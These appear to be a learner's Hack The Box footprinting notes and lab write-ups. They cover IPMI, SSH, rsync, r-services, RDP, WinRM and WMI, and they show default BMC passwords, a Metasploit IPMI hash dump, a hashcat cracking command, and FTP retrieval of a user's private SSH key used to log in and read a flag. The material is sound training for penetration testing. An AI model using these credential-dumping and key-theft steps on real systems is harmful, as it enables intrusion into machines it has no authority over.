[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Default Passwords
- During internal penetration tests, we often find BMCs where the administrators have not changed the default password. Some unique default passwords to keep in our cheatsheets include:

| Product | Username | Password |
|---|---|---|
| Dell iDRAC | `root` | `calvin` |
| HP iLO | `Administrator` | randomized 8-character string consisting of numbers and uppercase letters |
| Supermicro IPMI | `ADMIN` | `ADMIN` |


## Dangerous Settings
- If default credentials do not work to access a BMC, we can turn to a flaw in the RAKP protocol in IPMI 2.0. 
    - During the authentication process, the server sends a salted SHA1 or MD5 hash of the user's password to the client before authentication takes place.
    - This can be leveraged to obtain the password hash for ANY valid user account on the BMC. These password hashes can then be cracked offline using a dictionary attack using Hashcat mode 7300. 
    - In the event of an HP iLO using a factory default password, we can use this Hashcat mask attack command `hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u` which tries all combinations of upper case letters and numbers for an eight-character password.
- To retrieve IPMI hashes, we can use the Metasploit `IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval` module.

```bash
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 

Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):

   Name                 Current Setting                                                    Required  Description
   ----                 ---------------                                                    --------  -----------
   CRACK_COMMON         true                                                               yes       Automatically crack common passwords as they are obtained
   OUTPUT_HASHCAT_FILE                                                                     no        Save captured password hashes in hashcat format
   OUTPUT_JOHN_FILE                                                                        no        Save captured password hashes in john the ripper format
   PASS_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt  yes       File containing common passwords for offline cracking, one per line
   RHOSTS               10.129.42.195                                                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                623                                                                yes       The target port
   THREADS              1                                                                  yes       The number of concurrent threads (max one per host)
   USER_FILE            /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt      yes       File containing usernames, one per line



msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
- Here we can see that we have successfully obtained the password hash for the user ADMIN, and the tool was able to quickly crack it to reveal what appears to be a default password ADMIN.

# D. Linux Remote Management Protocols

## SSH
- `Secure Shell (SSH)` enables 2 computers to establish an encrypted and direct connection within a possibly insecure network.
- TCP port `22`.
- The SSH server can also be configured to only allow connections from specific clients.
- **2 Protocols**
  - `SSH-2`: More advanced protocol than SSH version 1 in encryption, speed, stability, and security.
  - `SSH-1`: Vulnerable to MITM attacks.
- The well-known `OpenBSD SSH (OpenSSH)` server on Linux distributions is an open-source fork of the original and commercial SSH server from SSH Communication Security. It has 6 authentication methods:
  1. Password Authentication
  2. Public-key Authentication
  3. Host-based Authentication
  4. Keyboard Authentication
  5. Challenge-response Authentication
  6. GSSAPI Authentication

### Default Configuration
- `sshd_config` file, responsible for the OpenSSH server, has only a few of the settings configured by default.

```bash
selwynang@htb[/htb]$ cat /etc/ssh/sshd_config  | grep -v "#" | sed -r '/^\s*$/d'

Include /etc/ssh/sshd_config.d/*.conf
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server
```

### Dangerous Settings
| Setting | Description |
|---|---|
| `PasswordAuthentication yes` | Allows password-based authentication. |
| `PermitEmptyPasswords yes` | Allows the use of empty passwords. |
| `PermitRootLogin yes` | Allows to log in as the root user. |
| `Protocol 1` | Uses an outdated version of encryption. |
| `X11Forwarding yes` | Allows X11 forwarding for GUI applications. |
| `AllowTcpForwarding yes` | Allows forwarding of TCP ports. |
| `PermitTunnel` | Allows tunneling. |
| `DebianBanner yes` | Displays a specific banner when logging in. |

- Allowing password authentication allows us to brute-force a known username for possible passwords.

## Footprinting the Service

### SSH-Audit
- Checks the client side and server side configuration and show some general information, and which encryption algorithms are still used by the client and server.

```bash
selwynang@htb[/htb]$ git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit
selwynang@htb[/htb]$ ./ssh-audit.py 10.129.14.132

# general
(gen) banner: SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3
(gen) software: OpenSSH 8.2p1
(gen) compatibility: OpenSSH 7.4+, Dropbear SSH 2018.76+
(gen) compression: enabled (zlib@openssh.com)                                   

# key exchange algorithms
(kex) curve25519-sha256                     -- [info] available since OpenSSH 7.4, Dropbear SSH 2018.76                            
(kex) curve25519-sha256@libssh.org          -- [info] available since OpenSSH 6.5, Dropbear SSH 2013.62
(kex) ecdh-sha2-nistp256                    -- [fail] using weak elliptic curves
                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62
(kex) ecdh-sha2-nistp384                    -- [fail] using weak elliptic curves
                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62
(kex) ecdh-sha2-nistp521                    -- [fail] using weak elliptic curves
                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62
(kex) diffie-hellman-group-exchange-sha256 (2048-bit) -- [info] available since OpenSSH 4.4
(kex) diffie-hellman-group16-sha512         -- [info] available since OpenSSH 7.3, Dropbear SSH 2016.73
(kex) diffie-hellman-group18-sha512         -- [info] available since OpenSSH 7.3
(kex) diffie-hellman-group14-sha256         -- [info] available since OpenSSH 7.3, Dropbear SSH 2016.73

# host-key algorithms
(key) rsa-sha2-512 (3072-bit)               -- [info] available since OpenSSH 7.2
(key) rsa-sha2-256 (3072-bit)               -- [info] available since OpenSSH 7.2
(key) ssh-rsa (3072-bit)                    -- [fail] using weak hashing algorithm
                                            `- [info] available since OpenSSH 2.5.0, Dropbear SSH 0.28
                                            `- [info] a future deprecation notice has been issued in OpenSSH 8.2: https://www.openssh.com/txt/release-8.2
(key) ecdsa-sha2-nistp256                   -- [fail] using weak elliptic curves
                                            `- [warn] using weak random number generator could reveal the key
                                            `- [info] available since OpenSSH 5.7, Dropbear SSH 2013.62
(key) ssh-ed25519                           -- [info] available since OpenSSH 6.5
...SNIP...

```

### Change Authentication Method
1. We can list out the possible types of authentication methods first.

```bash
selwynang@htb[/htb]$ ssh -v cry0l1t3@10.129.14.132

OpenSSH_8.2p1 Ubuntu-4ubuntu0.3, OpenSSL 1.1.1f  31 Mar 2020
debug1: Reading configuration data /etc/ssh/ssh_config 
...SNIP...
debug1: Authentications that can continue: publickey,password,keyboard-interactive

```
2. Once we confirm that password authentication can be used, we can specify it with the SSH client option `PreferredAuthentications` for brute-force attacks.
```bash
selwynang@htb[/htb]$ ssh -v cry0l1t3@10.129.14.132 -o PreferredAuthentications=password

OpenSSH_8.2p1 Ubuntu-4ubuntu0.3, OpenSSL 1.1.1f  31 Mar 2020
debug1: Reading configuration data /etc/ssh/ssh_config
...SNIP...
debug1: Authentications that can continue: publickey,password,keyboard-interactive
debug1: Next authentication method: password

cry0l1t3@10.129.14.132's password:
```

## Rsync
- `rsync` is a fast and efficient tool for locally and remotely copying files. It can be used to copy files locally on a given machine and to/from remote hosts.
- By default, it uses port `873` and can be configured to use SSH for secure file transfers by piggybacking on top of an established SSH server connection.
- `rsync` can be abused, most notably by listing the contents of a shared folder on a targer server and retrieving files:

1. **Scanning for Rsync**
```bash
selwynang@htb[/htb]$ sudo nmap -sV -p 873 127.0.0.1

Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-19 09:31 EDT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.0058s latency).

PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.13 seconds
```
2. **Probing for Accessible Shares**
```bash
selwynang@htb[/htb]$ nc -nv 127.0.0.1 873

(UNKNOWN) [127.0.0.1] 873 (rsync) open
@RSYNCD: 31.0
@RSYNCD: 31.0
#list
dev             Dev Tools
@RSYNCD: EXIT
```
- We found a share called `dev`.

3. **Enumerating an Open Share**
```bash
selwynang@htb[/htb]$ rsync -av --list-only rsync://127.0.0.1/dev

receiving incremental file list
drwxr-xr-x             48 2022/09/19 09:43:10 .
-rw-r--r--              0 2022/09/19 09:34:50 build.sh
-rw-r--r--              0 2022/09/19 09:36:02 secrets.yaml
drwx------             54 2022/09/19 09:43:10 .ssh

sent 25 bytes  received 221 bytes  492.00 bytes/sec
total size is 0  speedup is 0.00
```
- We see a directory likely containing SSH keys being accessible.
- From here, we could sync all files to our attack host with the command `rsync -av rsync://127.0.0.1/dev`. If Rsync is configured to use SSH to transfer files, we could modify our commands to include the `-e ssh` flag, or `-e "ssh -p2222"` if a non-standard port is in use for SSH. 

## R-Services
- R-Services are a suite of services hosted to enable remote access or issue commands between Unix hosts over TCP/IP.
- `r-services` were the de facto standard for remote access between Unix operating systems until they were replaced by the `Secure Shell (SSH)` protocols and commands due to inherent security flaws built into them. 
- Much like telnet, `r-services` transmit information from client to server(and vice versa.) over the network in an unencrypted format, making it possible for attackers to intercept network traffic (passwords, login information, etc.) by performing man-in-the-middle (MITM) attacks.
- `r-services` span across ports `512`, `513`, and `514` and are only accessible through a suite of programs known as `r-commands`:

| Command | Service Daemon | Port | Transport Protocol | Description |
|---|---|---|---|---|
| `rcp` | `rshd` | 514 | TCP | Copy a file or directory bidirectionally from the local system to the remote system (or vice versa) or from one remote system to another. It works like the `cp` command on Linux but provides no warning to the user for overwriting existing files on a system. |
| `rsh` | `rshd` | 514 | TCP | Opens a shell on a remote machine without a login procedure. Relies upon the trusted entries in the `/etc/hosts.equiv` and `.rhosts` files for validation. |
| `rexec` | `rexecd` | 512 | TCP | Enables a user to run shell commands on a remote machine. Requires authentication through the use of a username and password through an unencrypted network socket. Authentication is overridden by the trusted entries in the `/etc/hosts.equiv` and `.rhosts` files. |
| `rlogin` | `rlogind` | 513 | TCP | Enables a user to log in to a remote host over the network. It works similarly to `telnet` but can only connect to Unix-like hosts. Authentication is overridden by the trusted entries in the `/etc/hosts.equiv` and `.rhosts` files. |

### /etc/hosts.equiv File
- `/etc/hosts.equiv` file contains a list of trusted hosts and is used to grant access to other systems on the network. 
- When users on one of these hosts attempt to access the system, they are automatically granted access without further authentication.
```bash
selwynang@htb[/htb]$ cat /etc/hosts.equiv

# <hostname> <local username>
pwnbox cry0l1t3
```

### .rhosts File
```bash
selwynang@htb[/htb]$ cat .rhosts

# <username> <ip address>
# Additionally, the + modifier can be used within these files as a wildcard to specify anything. In this example, the + modifier allows any external user to access r-commands from the htb-student user account via the host with the IP address 10.0.17.10.

htb-student     10.0.17.5
+               10.0.17.10
+               +

```

### Scanning for R-services with Nmap
```bash
selwynang@htb[/htb]$ sudo nmap -sV -p 512,513,514 10.0.17.2

Starting Nmap 7.80 ( https://nmap.org ) at 2022-12-02 15:02 EST
Nmap scan report for 10.0.17.2
Host is up (0.11s latency).

PORT    STATE SERVICE    VERSION
512/tcp open  exec?
513/tcp open  login?
514/tcp open  tcpwrapped

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 145.54 seconds
```

### Logging in Using Rlogin
```bash
selwynang@htb[/htb]$ rlogin 10.0.17.2 -l htb-student

Last login: Fri Dec  2 16:11:21 from localhost

[htb-student@localhost ~]$

```

### Listing Authenticated Users using Rwho
```bash
selwynang@htb[/htb]$ rwho

root     web01:pts/0 Dec  2 21:34
htb-student     workstn01:tty1  Dec  2 19:57  2:25       
```
- We can see that the `htb-student` user is currently authenticated to the `workstn01` host, whereas the `root` user is authenticated to the `web01` host.

### Listing Authenticated Users Using Rusers
```bash
selwynang@htb[/htb]$ rusers -al 10.0.17.5

htb-student     10.0.17.5:console          Dec 2 19:57     2:25
```

# E. Windows Remote Management Protocol

## RDP
-  `Remote Desktop Protocol (RDP)` is a protocol developed by Microsoft for remote access to a computer running the Windows operating system. 
- This protocol allows display and control commands to be transmitted via the GUI encrypted over IP networks. 
- RDP works at the application layer in the TCP/IP reference model, typically utilizing TCP port `3389` as the transport protocol. 
- However, the connectionless UDP protocol can use port `3389` also for remote administration.

### Footprinting the Service

#### Nmap
```bash
selwynang@htb[/htb]$ nmap -sV -sC 10.129.201.248 -p3389 --script rdp*

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-06 15:45 CET
Nmap scan report for 10.129.201.248
Host is up (0.036s latency).

PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-enum-encryption: 
|   Security layer
|     CredSSP (NLA): SUCCESS
|     CredSSP with Early User Auth: SUCCESS
|_    RDSTLS: SUCCESS
| rdp-ntlm-info: 
|   Target_Name: ILF-SQL-01
|   NetBIOS_Domain_Name: ILF-SQL-01
|   NetBIOS_Computer_Name: ILF-SQL-01
|   DNS_Domain_Name: ILF-SQL-01
|   DNS_Computer_Name: ILF-SQL-01
|   Product_Version: 10.0.17763
|_  System_Time: 2021-11-06T13:46:00+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.26 seconds
``` 

#### RDP Security Check
- A Perl script named `rdp-sec-check.pl` has also been developed by Cisco CX Security Labs that can unauthentically identify the security settings of RDP servers based on the handshakes.
  1.  **Installation**
```bash
selwynang@htb[/htb]$ sudo cpan

Loading internal logger. Log::Log4perl recommended for better logging

CPAN.pm requires configuration, but most of it can be done automatically.
If you answer 'no' below, you will enter an interactive dialog for each
configuration option instead.

Would you like to configure as much as possible automatically? [yes] yes


Autoconfiguration complete.

commit: wrote '/root/.cpan/CPAN/MyConfig.pm'

You can re-run configuration any time with 'o conf init' in the CPAN shell

cpan shell -- CPAN exploration and modules installation (v2.27)
Enter 'h' for help.


cpan[1]> install Encoding::BER

Fetching with LWP:
http://www.cpan.org/authors/01mailrc.txt.gz
Reading '/root/.cpan/sources/authors/01mailrc.txt.gz'
............................................................................DONE
...SNIP...
```
  2. **Security Check Process**
```bash
selwynang@htb[/htb]$ git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
selwynang@htb[/htb]$ ./rdp-sec-check.pl 10.129.201.248

Starting rdp-sec-check v0.9-beta ( http://labs.portcullis.co.uk/application/rdp-sec-check/ ) at Sun Nov  7 16:50:32 2021

[+] Scanning 1 hosts

Target:    10.129.201.248
IP:        10.129.201.248
Port:      3389

[+] Checking supported protocols

[-] Checking if RDP Security (PROTOCOL_RDP) is supported...Not supported - HYBRID_REQUIRED_BY_SERVER
[-] Checking if TLS Security (PROTOCOL_SSL) is supported...Not supported - HYBRID_REQUIRED_BY_SERVER
[-] Checking if CredSSP Security (PROTOCOL_HYBRID) is supported [uses NLA]...Supported

[+] Checking RDP Security Layer

[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_NONE...Not supported
[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_40BIT...Not supported
[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_128BIT...Not supported
[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_56BIT...Not supported
[-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_FIPS...Not supported

[+] Summary of protocol support

[-] 10.129.201.248:3389 supports PROTOCOL_SSL   : FALSE
[-] 10.129.201.248:3389 supports PROTOCOL_HYBRID: TRUE
[-] 10.129.201.248:3389 supports PROTOCOL_RDP   : FALSE

[+] Summary of RDP encryption support

[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_NONE   : FALSE
[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_40BIT  : FALSE
[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_128BIT : FALSE
[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_56BIT  : FALSE
[-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_FIPS   : FALSE

[+] Summary of security issues


rdp-sec-check v0.9-beta completed at Sun Nov  7 16:50:33 2021
```

#### Initiate an RDP Session
```bash
selwynang@htb[/htb]$ xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248

[16:37:47:135] [95319:95320] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[16:37:47:135] [95319:95320] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[16:37:47:135] [95319:95320] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[16:37:47:135] [95319:95320] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
[16:37:47:447] [95319:95320] [INFO][com.freerdp.primitives] - primitives autodetect, using optimized
[16:37:47:453] [95319:95320] [INFO][com.freerdp.core] - freerdp_tcp_is_hostname_resolvable:freerdp_set_last_error_ex resetting error state
[16:37:47:453] [95319:95320] [INFO][com.freerdp.core] - freerdp_tcp_connect:freerdp_set_last_error_ex resetting error state
[16:37:47:523] [95319:95320] [INFO][com.freerdp.crypto] - creating directory /home/cry0l1t3/.config/freerdp
[16:37:47:523] [95319:95320] [INFO][com.freerdp.crypto] - creating directory [/home/cry0l1t3/.config/freerdp/certs]
[16:37:47:523] [95319:95320] [INFO][com.freerdp.crypto] - created directory [/home/cry0l1t3/.config/freerdp/server]
[16:37:47:599] [95319:95320] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[16:37:47:599] [95319:95320] [WARN][com.freerdp.crypto] - CN = ILF-SQL-01
[16:37:47:600] [95319:95320] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[16:37:47:600] [95319:95320] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[16:37:47:600] [95319:95320] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[16:37:47:600] [95319:95320] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.201.248:3389) 
[16:37:47:600] [95319:95320] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[16:37:47:600] [95319:95320] [ERROR][com.freerdp.crypto] - Common Name (CN):
[16:37:47:600] [95319:95320] [ERROR][com.freerdp.crypto] -      ILF-SQL-01
[16:37:47:600] [95319:95320] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.201.248:3389 (RDP-Server):
        Common Name: ILF-SQL-01
        Subject:     CN = ILF-SQL-01
        Issuer:      CN = ILF-SQL-01
        Thumbprint:  b7:5f:00:ca:91:00:0a:29:0c:b5:14:21:f3:b0:ca:9e:af:8c:62:d6:dc:f9:50:ec:ac:06:38:1f:c5:d6:a9:39
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.


Do you trust the above certificate? (Y/T/N) y

[16:37:48:801] [95319:95320] [INFO][com.winpr.sspi.NTLM] - VERSION ={
[16:37:48:801] [95319:95320] [INFO][com.winpr.sspi.NTLM] -      ProductMajorVersion: 6
[16:37:48:801] [95319:95320] [INFO][com.winpr.sspi.NTLM] -      ProductMinorVersion: 1
[16:37:48:801] [95319:95320] [INFO][com.winpr.sspi.NTLM] -      ProductBuild: 7601
[16:37:48:801] [95319:95320] [INFO][com.winpr.sspi.NTLM] -      Reserved: 0x000000
```

## WinRM
- `Windows Remote Management (WinRM)` is a simple Windows integrated remote management protocol based on the command line. 
- WinRM relies on TCP ports `5985` and `5986` for communication, with the last port `5986` using HTTPS.

### Footprinting the Service

#### Nmap
- WinRM uses TCP ports `5985` (HTTP) and `5986` (HTTPS) by default, which we can scan using Nmap. However, often we will see that only HTTP (TCP 5985) is used instead of HTTPS (TCP 5986).
```bash
selwynang@htb[/htb]$ nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n

Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-06 16:31 CET
Nmap scan report for 10.129.201.248
Host is up (0.030s latency).

PORT     STATE SERVICE VERSION
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.34 seconds
```

#### Evil-winrm
```bash
selwynang@htb[/htb]$ evil-winrm -i 10.129.201.248 -u Cry0l1t3 -p P455w0rD!

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Cry0l1t3\Documents>
```

## WMI
- `Windows Management Instrumentation (WMI)` is Microsoft's implementation and also an extension of the Common Information Model (CIM), core functionality of the standardized Web-Based Enterprise Management (WBEM) for the Windows platform. 
- `WMI` allows read and write access to almost all settings on Windows systems. Understandably, this makes it the most critical interface in the Windows environment for the administration and remote maintenance of Windows computers, regardless of whether they are PCs or servers. 
- `WMI` is typically accessed via PowerShell, VBScript, or the Windows Management Instrumentation Console (WMIC).

### Footprinting the Service
- The initialization of the WMI communication always takes place on TCP port `135`, and after the successful establishment of the connection, the communication is moved to a random port.

#### WMIexec.py
```bash
selwynang@htb[/htb]$ /usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] SMBv3.0 dialect used
ILF-SQL-01
```

# F. Footprinting Lab - Easy
## Nmap Scan
```bash
┌─[eu-academy-5]─[10.10.14.52]─[htb-ac-2300483@htb-pevlbnxcjc]─[~]
└──╼ [★]$ sudo nmap -sV 10.129.174.131
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-01 02:35 EDT
Nmap scan report for 10.129.174.131
Host is up (0.17s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     ProFTPD
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
2121/tcp open  ftp     ProFTPD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.17 seconds
```
A few services are running:
- FTP on ports 21 and 2121
- SSH shell on port 22
- DNS server on port 53

## Interacting with the FTP server
We will try to interact with FTP server on port 2121 by logging with the provided credentials of `ceil:qwer1234`.

```bash
┌─[eu-academy-5]─[10.10.14.52]─[htb-ac-2300483@htb-pevlbnxcjc]─[~]
└──╼ [★]$ ftp 10.129.174.131 2121
Connected to 10.129.174.131.
220 ProFTPD Server (Ceil's FTP) [10.129.174.131]
Name (10.129.174.131:root): ceil
331 Password required for ceil
Password: 
230 User ceil logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||4122|)
150 Opening ASCII mode data connection for file list
226 Transfer complete
ftp> ls -al
229 Entering Extended Passive Mode (|||49412|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   4 ceil     ceil         4096 Nov 10  2021 .
drwxr-xr-x   4 ceil     ceil         4096 Nov 10  2021 ..
-rw-------   1 ceil     ceil          294 Nov 10  2021 .bash_history
-rw-r--r--   1 ceil     ceil          220 Nov 10  2021 .bash_logout
-rw-r--r--   1 ceil     ceil         3771 Nov 10  2021 .bashrc
drwx------   2 ceil     ceil         4096 Nov 10  2021 .cache
-rw-r--r--   1 ceil     ceil          807 Nov 10  2021 .profile
drwx------   2 ceil     ceil         4096 Nov 10  2021 .ssh
-rw-------   1 ceil     ceil          759 Nov 10  2021 .viminfo
226 Transfer complete
ftp> cd .ssh
250 CWD command successful
ftp> ls -al
229 Entering Extended Passive Mode (|||45303|)
150 Opening ASCII mode data connection for file list
drwx------   2 ceil     ceil         4096 Nov 10  2021 .
drwxr-xr-x   4 ceil     ceil         4096 Nov 10  2021 ..
-rw-rw-r--   1 ceil     ceil          738 Nov 10  2021 authorized_keys
-rw-------   1 ceil     ceil         3381 Nov 10  2021 id_rsa
-rw-r--r--   1 ceil     ceil          738 Nov 10  2021 id_rsa.pub
226 Transfer complete
ftp> get id_rsa
local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||5848|)
150 Opening BINARY mode data connection for id_rsa (3381 bytes)
100% |*************************************************************************************************************************************************|  3381        5.19 MiB/s    00:00 ETA
226 Transfer complete
3381 bytes received in 00:00 (19.27 KiB/s)
ftp> 

```

The log in was successful and we managed to download the private key of the user `ceil`.

## Interacting with SSH
Initially, we tried to log in to SSH via password authentication but it failed. However, we have knowledge of the private key which we can use to authenticate as the user `ceil`.

However, before attempting to authenticate, we need to change the permissions of the private key file which we downloaded via the command `chmod 600 id_rsa` which sets it to owner read/write only.

```bash
┌─[eu-academy-5]─[10.10.14.52]─[htb-ac-2300483@htb-pevlbnxcjc]─[~]
└──╼ [★]$ ssh -i id_rsa ceil@10.129.174.131
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-90-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 01 Sep 2026 06:40:07 AM UTC

  System load:  0.0               Processes:               178
  Usage of /:   86.2% of 3.87GB   Users logged in:         0
  Memory usage: 14%               IPv4 address for ens192: 10.129.174.131
  Swap usage:   0%

  => / is using 86.2% of 3.87GB

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

116 updates can be installed immediately.
1 of these updates is a security update.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Nov 10 05:48:02 2021 from 10.10.14.20
ceil@NIXEASY:~$ ls
ceil@NIXEASY:~$ ls -al
total 36
drwxr-xr-x 4 ceil ceil 4096 Nov 10  2021 .
drwxr-xr-x 5 root root 4096 Nov 10  2021 ..
-rw------- 1 ceil ceil  294 Nov 10  2021 .bash_history
-rw-r--r-- 1 ceil ceil  220 Nov 10  2021 .bash_logout
-rw-r--r-- 1 ceil ceil 3771 Nov 10  2021 .bashrc
drwx------ 2 ceil ceil 4096 Nov 10  2021 .cache
-rw-r--r-- 1 ceil ceil  807 Nov 10  2021 .profile
drwx------ 2 ceil ceil 4096 Nov 10  2021 .ssh
-rw------- 1 ceil ceil  759 Nov 10  2021 .viminfo
ceil@NIXEASY:~$ cd ..
ceil@NIXEASY:/home$ ls -al
total 20
drwxr-xr-x  5 root     root     4096 Nov 10  2021 .
drwxr-xr-x 20 root     root     4096 Dec 15  2020 ..
drwxr-xr-x  4 ceil     ceil     4096 Nov 10  2021 ceil
drwxr-xr-x  3 cry0l1t3 cry0l1t3 4096 Nov 10  2021 cry0l1t3
drwxr-xr-x  4 ceil     ceil     4096 Nov 10  2021 flag
ceil@NIXEASY:/home$ cd flag
ceil@NIXEASY:/home/flag$ ls
flag.txt
ceil@NIXEASY:/home/flag$ cat flag.txt
HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}
ceil@NIXEASY:/home/flag$ 
```

Flag is found and it is : `HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}`.

# G. Footprinting Lab - Medium

## Nmap Scan
```bash
┌─[eu-academy-5]─[10.10.14.52]─[htb-ac-2300483@htb-pzpej3zhwv]─[~]
└──╼ [★]$ sudo nmap -sV 10.129.202.41
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-01 02:55 EDT
Nmap scan report for 10.129.202.41
Host is up (0.17s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
111/tcp  open  rpcbind       2-4 (RPC #100000)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  nlockmgr      1-4 (RPC #100021)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 160.09 seconds
```

This is a Windows machine. Here are the services running:
| Port | Service | Version | Description |
|---|---|---|---|
| 111/tcp | `rpcbind` | 2-4 (RPC #100000) | RPC port mapper — maps RPC services to their ports |
| 135/tcp | `msrpc` | Microsoft Windows RPC | Used for Windows service communication |
| 139/tcp | `netbios-ssn` | Microsoft Windows netbios-ssn | Legacy Windows file/printer sharing |
| 445/tcp | `microsoft-ds` | ? | Windows SMB file sharing |
